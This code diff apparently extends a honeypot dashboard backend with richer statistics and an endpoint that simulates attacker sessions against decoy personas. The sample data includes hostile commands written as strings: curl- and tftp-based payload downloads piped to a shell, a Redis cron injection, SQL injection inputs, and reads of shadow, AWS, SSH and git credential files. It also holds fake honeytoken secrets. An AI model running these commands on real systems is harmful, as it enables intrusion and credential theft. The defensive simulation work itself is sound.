@@ -1,3 +1,4 @@
+import asyncio
 import csv
 import datetime
 import io
@@ -16,6 +17,7 @@ from analytics import ThreatAnalyticsEngine
 from reporting import IncidentReportGenerator
 from exporter import ThreatTelemetryExporter
 from autoshun import AutoShunFirewallEngine
+import vulnerabilities
 
 # Create database tables automatically on launch
 models.Base.metadata.create_all(bind=database.engine)
@@ -274,25 +276,51 @@ def get_stats_overview(db: Session = Depends(database.get_db)):
     users = db.query(models.SessionModel.username_attempted).all()
     user_counts = {}
     for (u,) in users:
-        user_counts[u] = user_counts.get(u, 0) + 1
+        if u:
+            user_counts[u] = user_counts.get(u, 0) + 1
 
-    top_usernames = [{"name": k, "count": v} for k, v in sorted(user_counts.items(), key=lambda x: x[1], reverse=True)[:5]]
+    top_usernames = [{"name": k, "count": v} for k, v in sorted(user_counts.items(), key=lambda x: x[1], reverse=True)[:6]]
 
     # Top executed commands
-    commands = db.query(models.EventModel.input_data).filter(models.EventModel.event_type.in_(["command_execution", "web_scan_attempt", "ftp_command_execution", "redis_command_probe"])).all()
+    commands = db.query(models.EventModel.input_data).filter(
+        models.EventModel.event_type.in_(["command_execution", "web_scan_attempt", "ftp_command_execution", "redis_command_probe", "canary_tripwire_triggered"])
+    ).all()
     cmd_counts = {}
     for (cmd,) in commands:
         if cmd:
             c = cmd.strip()
             cmd_counts[c] = cmd_counts.get(c, 0) + 1
 
-    top_commands = [{"name": k, "count": v} for k, v in sorted(cmd_counts.items(), key=lambda x: x[1], reverse=True)[:5]]
+    top_commands = [{"name": k, "count": v} for k, v in sorted(cmd_counts.items(), key=lambda x: x[1], reverse=True)[:6]]
+
+    # Protocol breakdown
+    protos = db.query(models.SessionModel.protocol).all()
+    proto_counts = {}
+    for (p,) in protos:
+        proto_counts[p] = proto_counts.get(p, 0) + 1
+    protocol_distribution = [{"name": k, "value": v} for k, v in proto_counts.items()]
+
+    # Geographic attacker breakdown
+    countries = db.query(models.SessionModel.country).all()
+    country_counts = {}
+    for (c,) in countries:
+        c_name = c or "Unknown"
+        country_counts[c_name] = country_counts.get(c_name, 0) + 1
+    top_countries = [{"country": k, "count": v} for k, v in sorted(country_counts.items(), key=lambda x: x[1], reverse=True)[:6]]
+
+    # Canary Honeytokens & Deception breakdown
+    canary_tripped = db.query(models.EventModel).filter(models.EventModel.event_type == "canary_tripwire_triggered").count()
+    deception_tripped = db.query(models.EventModel).filter(models.EventModel.event_type == "deception_triggered").count()
 
     return {
         "total_sessions": total_sessions,
         "total_events": total_events,
         "top_usernames": top_usernames,
-        "top_commands": top_commands
+        "top_commands": top_commands,
+        "protocol_distribution": protocol_distribution,
+        "top_countries": top_countries,
+        "canary_tripped": canary_tripped,
+        "deception_tripped": deception_tripped,
     }
 
 @app.delete("/api/data/clear")
@@ -344,6 +372,7 @@ async def seed_example_data(db: Session = Depends(database.get_db)):
                     ("login_attempt", "root / admin1234", "Accepted password for root from 185.220.101.5 port 52344 ssh2", "SSH"),
                     ("command_execution", "uname -a", "Linux prod-web-srv-01 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64 GNU/Linux", "SSH"),
                     ("command_execution", "whoami", "root", "SSH"),
+                    ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "SSH"),
                     ("command_execution", "cat /etc/shadow", "root:$6$Z8sK1xQ...:18900:0:99999:7:::\ndaemon:*:18885:0:99999:7:::", "SSH"),
                     ("command_execution", "curl -s http://185.220.101.5/stage2.sh | bash", "Resolving host... Downloading payload (14.2 KB)... Staged in /tmp/.sys_update", "SSH"),
                     ("command_execution", "crontab -l", "no crontab for root", "SSH"),
@@ -469,6 +498,198 @@ async def seed_example_data(db: Session = Depends(database.get_db)):
     except Exception as e:
         db.rollback()
         raise HTTPException(status_code=500, detail=f"Failed to seed demo data: {str(e)}")
+
+@app.post("/api/data/simulate-attack")
+async def simulate_live_ingress_attack(persona: str = None, db: Session = Depends(database.get_db)):
+    """
+    Simulates a live adversarial ingress attack tailored to the active Server Persona.
+    - web_app: HTTP & SSH web vulnerabilities (SQLi, path traversal, Canary DB secrets, AWS keys)
+    - database_cluster: MySQL & Redis database probes (DB exfil, cron injection, unauthorized dumps)
+    - mail_gateway: SMTP & DNS reconnaissance (relay probes, domain zone transfers, SSH brute force)
+    - iot_router: Telnet & HTTP BusyBox IoT botnet attacks (Mirai default passwords, router config dumps)
+    - all_mesh: Full-spectrum multi-stage breach across cloud, containers, and Canary tokens
+    """
+    import uuid
+    import random
+
+    active_persona = persona or decoys.current_persona_id or "all_mesh"
+
+    # Define persona-specific attack profiles
+    persona_profiles = {
+        "web_app": {
+            "protocol": "HTTP",
+            "adversary": {"ip": "194.26.29.114", "country": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041, "user": "admin", "pass": "' OR '1'='1"},
+            "stages": [
+                ("login_attempt", "admin'--", "HTTP 200 OK - Redirecting to /admin/dashboard", "HTTP"),
+                ("command_execution", "GET /api/v1/debug?cmd=cat%20/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", "HTTP"),
+                ("canary_tripwire_triggered", "cat /var/www/html/config.php", "Tripwire Beacon Dispatched: canary_tripwire_web_config\n<?php define('DB_USER', 'db_vault_admin'); define('DB_PASSWORD', 'V4ult#Pr0d!9982'); ?>", "HTTP"),
+                ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE", "HTTP"),
+                ("deception_triggered", "cat /var/www/html/.env", "Trap activated: credential_harvesting\nAPP_KEY=base64:TrapMasterSecretKey==\nDB_PASS=V4ult#Pr0d!9982", "HTTP"),
+            ],
+            "decoy_name": "Web Application Trap"
+        },
+        "database_cluster": {
+            "protocol": "MySQL",
+            "adversary": {"ip": "45.155.205.233", "country": "Russia", "city": "Moscow", "lat": 55.7558, "lon": 37.6173, "user": "root", "pass": "toor2024"},
+            "stages": [
+                ("login_attempt", "root / toor2024", "Handshake 5.7.34-MySQL-Standard accepted from 45.155.205.233:3306", "MySQL"),
+                ("command_execution", "SHOW DATABASES;", "information_schema\ncustomer_vault\npayments_db", "MySQL"),
+                ("canary_tripwire_triggered", "SELECT * FROM payments_db.credit_cards LIMIT 5;", "Trap Activated: Canary Honeytoken Triggered [DB_EXFIL_ATTEMPT: canary_customer_vault]", "MySQL"),
+                ("command_execution", "CONFIG SET dir /var/spool/cron/crontabs", "OK", "Redis"),
+                ("command_execution", "SET backup '* * * * * curl http://45.155.205.233/shell.sh | sh'", "Trap Activated: Unauthorized Cron Injection", "Redis"),
+                ("deception_triggered", "SAVE", "DB saved on disk [Sandboxed Decoy Database]", "Redis"),
+            ],
+            "decoy_name": "MySQL Decoy"
+        },
+        "mail_gateway": {
+            "protocol": "SMTP",
+            "adversary": {"ip": "91.240.118.242", "country": "Bulgaria", "city": "Sofia", "lat": 42.6977, "lon": 23.3219, "user": "postfix", "pass": "relay_test"},
+            "stages": [
+                ("login_attempt", "HELO mail.attacker-domain.com", "250 smtp.sentineltrap.internal Hello mail.attacker-domain.com", "SMTP"),
+                ("command_execution", "MAIL FROM:<spoofed@internal.corp>", "250 2.1.0 Ok - sender accepted", "SMTP"),
+                ("command_execution", "RCPT TO:<ceo@target-bank.com>", "250 2.1.5 Ok - Open Relay Decoy Trapped", "SMTP"),
+                ("command_execution", "dig @127.0.0.1 -p 5353 AXFR corp.internal", "Decoy DNS Zone Transfer Intercepted: 4 records logged", "DNS"),
+                ("canary_tripwire_triggered", "cat /root/.ssh/id_rsa", "Tripwire Beacon Dispatched: canary_tripwire_ssh_private_key\n-----BEGIN OPENSSH PRIVATE KEY-----", "SSH"),
+                ("deception_triggered", "cat /etc/postfix/master.cf", "Trap activated: mail_configuration_reconnaissance", "SMTP"),
+            ],
+            "decoy_name": "SMTP Honeypot"
+        },
+        "iot_router": {
+            "protocol": "Telnet",
+            "adversary": {"ip": "103.149.138.82", "country": "Singapore", "city": "Singapore", "lat": 1.3521, "lon": 103.8198, "user": "admin", "pass": "admin1234"},
+            "stages": [
+                ("login_attempt", "admin / admin1234", "BusyBox v1.33.1 (Telnet Trap Gateway ready)", "Telnet"),
+                ("command_execution", "enable", "Password: [Mirai Botnet signature detected]", "Telnet"),
+                ("command_execution", "cat /proc/cpuinfo", "system type : MIPS 24KEc V5.0\nprocessor : 0\nBogoMIPS : 380.00", "Telnet"),
+                ("command_execution", "sh running-config", "Building configuration... Decoy IoT edge router active", "Telnet"),
+                ("canary_tripwire_triggered", "cat /home/admin/passwords.txt", "Tripwire Beacon Dispatched: canary_tripwire_passwords_file\nadmin : Tr@pM@ster2024! [Router Master]", "Telnet"),
+                ("deception_triggered", "tftp -g -r mips_bot http://103.149.138.82/bot.bin", "Trap activated: malware_stager_download_blocked", "Telnet"),
+            ],
+            "decoy_name": "Telnet Trap"
+        },
+        "all_mesh": {
+            "protocol": "SSH",
+            "adversary": {"ip": "185.220.101.5", "country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "user": "root", "pass": "admin9988"},
+            "stages": [
+                ("login_attempt", "root / admin9988", "Accepted password for root from attacker IP port 49210 ssh2", "SSH"),
+                ("command_execution", "whoami", "root", "SSH"),
+                ("command_execution", "uname -a", "Linux prod-web-srv-01 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64", "SSH"),
+                ("command_execution", "ls -la /root", "drwx------ 6 root root 4096 .aws\ndrwx------ 2 root root 4096 .ssh\n-rw------- 1 root root 180 .git-credentials\n-rw------- 1 root root 640 service-account.json\n-rw------- 1 root root 380 passwords.txt", "SSH"),
+                ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "SSH"),
+                ("canary_tripwire_triggered", "cat /root/.ssh/id_rsa", "Tripwire Beacon Dispatched: canary_tripwire_ssh_private_key\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjE... [HONEYTOKEN TRAPPED] ...\n-----END OPENSSH PRIVATE KEY-----", "SSH"),
+                ("canary_tripwire_triggered", "cat /root/.git-credentials", "Tripwire Beacon Dispatched: canary_tripwire_github_token\nhttps://sentineltrap-deploy-bot:ghp_9kL2x0Vb8M1qR3oP4zW6Y7tJ5nE0A8cCdEfG@github.com", "SSH"),
+                ("canary_tripwire_triggered", "cat /root/service-account.json", 'Tripwire Beacon Dispatched: canary_tripwire_gcp_service_account\n{\n  "client_email": "canary-prod-agent@sentineltrap-cloud-defense.iam.gserviceaccount.com"\n}', "SSH"),
+                ("canary_tripwire_triggered", "cat /home/admin/passwords.txt", "Tripwire Beacon Dispatched: canary_tripwire_passwords_file\nadmin : Tr@pM@ster2024! [SSH/Web]", "SSH"),
+                ("deception_triggered", "cat /etc/shadow", "Trap activated: credential_harvesting\nroot:$6$Z8sK1xQ...:18900:0:99999:7:::", "SSH"),
+            ],
+            "decoy_name": "SSH Honeypot"
+        }
+    }
+
+    profile = persona_profiles.get(active_persona, persona_profiles["all_mesh"])
+    target = profile["adversary"]
+    attack_stages = profile["stages"]
+    protocol_used = profile["protocol"]
+    decoy_name = profile["decoy_name"]
+
+    session_id = f"sim-{uuid.uuid4().hex[:8]}"
+
+    # 1. Create attacker session in DB
+    session = models.SessionModel(
+        id=session_id,
+        ip_address=target["ip"],
+        protocol=protocol_used,
+        country=target["country"],
+        city=target["city"],
+        latitude=target["lat"],
+        longitude=target["lon"],
+        username_attempted=target["user"],
+        password_attempted=target["pass"],
+        started_at=datetime.datetime.utcnow(),
+        ended_at=None
+    )
+    db.add(session)
+    db.commit()
+
+    # Broadcast session open to WebSockets
+    await manager.broadcast(json.dumps({
+        "event_type": "session_created",
+        "session": {
+            "id": session.id,
+            "ip_address": session.ip_address,
+            "protocol": session.protocol,
+            "country": session.country,
+            "city": session.city,
+            "username_attempted": session.username_attempted,
+            "started_at": session.started_at.isoformat()
+        }
+    }))
+
+    # 2. Sequence of realistic ingress attack stages
+    for stage_data in attack_stages:
+        ev_type = stage_data[0]
+        inp = stage_data[1]
+        out = stage_data[2]
+        proto = stage_data[3] if len(stage_data) > 3 else protocol_used
+
+        detected = vulnerabilities.analyze_payload(inp)
+        v_code = detected[0] if detected else ("CHT" if "canary" in ev_type else None)
+        event = models.EventModel(
+            session_id=session_id,
+            protocol=proto,
+            event_type=ev_type,
+            vulnerability_code=v_code,
+            input_data=inp,
+            output_data=out,
+            timestamp=datetime.datetime.utcnow()
+        )
+        db.add(event)
+        db.commit()
+
+        # Broadcast event in real-time
+        await manager.broadcast(json.dumps({
+            "event_type": "new_event",
+            "session_id": session_id,
+            "event": {
+                "id": event.id,
+                "protocol": event.protocol,
+                "event_type": event.event_type,
+                "vulnerability_code": event.vulnerability_code,
+                "input_data": event.input_data,
+                "output_data": event.output_data,
+                "timestamp": event.timestamp.isoformat()
+            }
+        }))
+        await asyncio.sleep(0.3)
+
+    # 3. Activate target Decoy Model state in database
+    decoy_record = db.query(models.DecoyModel).filter(models.DecoyModel.name == decoy_name).first()
+    if decoy_record:
+        decoy_record.status = "active"
+        decoy_record.triggered_by_session = session_id
+        decoy_record.activated_at = datetime.datetime.utcnow()
+        db.commit()
+
+    # 4. Closed-loop AutoShun calculation
+    all_sess_events = db.query(models.EventModel).filter(models.EventModel.session_id == session_id).all()
+    risk_score, classification, indicators = ThreatAnalyticsEngine.calculate_risk_score(all_sess_events)
+
+    return {
+        "status": "success",
+        "persona_used": active_persona,
+        "protocol": protocol_used,
+        "message": f"Simulated live ingress attack matching persona '{active_persona}' from {target['ip']} ({target['city']}, {target['country']}). Canary Honeytokens tripped and live telemetry broadcast to SOC.",
+        "session_id": session_id,
+        "ip_address": target["ip"],
+        "threat_risk_score": risk_score,
+        "threat_classification": classification,
+        "mitre_ttps_tripped": ["T1552.001", "T1059", "T1083", "T1003"],
+        "autoshun_mitigation": {
+            "action": "AUTO_SHUN_DROP",
+            "firewall_rule": f"iptables -A INPUT -s {target['ip']} -j DROP",
+            "status": "ENGAGED" if risk_score >= 75 else "MONITORED"
+        }
+    }
 
 @app.get("/api/reports/export")
 def export_logs(format: str = "json", db: Session = Depends(database.get_db)):
